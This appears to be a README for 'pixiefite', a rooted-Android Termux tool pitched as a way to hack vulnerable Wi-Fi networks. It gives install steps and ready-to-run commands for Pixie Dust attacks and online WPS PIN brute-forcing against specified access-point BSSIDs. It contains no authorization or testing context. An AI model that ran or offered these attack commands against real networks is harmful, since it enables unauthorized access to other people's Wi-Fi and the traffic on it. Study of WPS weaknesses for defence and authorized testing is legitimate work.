# pixiefite
Hack vulnerable Wi-Fi networks using Termux (rooted)

### Installation :

```bash
pkg update && pkg upgrade -y
pkg install root-repo -y
pkg install git tsu python wpa-supplicant pixiewps iw openssl -y
git clone https://github.com/vladimir127001/pixiefite
cd pixiefite
chmod +x pixiefite0.0.1.py
```

#### Help : `sudo python main --help`
#### Example : `sudo python pixiefite0.0.1.py -i wlan0 -K`

#### Usage: 
+ **First turn off your Wifi.**
+ **Turn on Hotspot.**
+ **Turn on Location.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python pixiefite0.0.1.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python pixiefite0.0.1.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python pixiefite0.0.1.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**

---
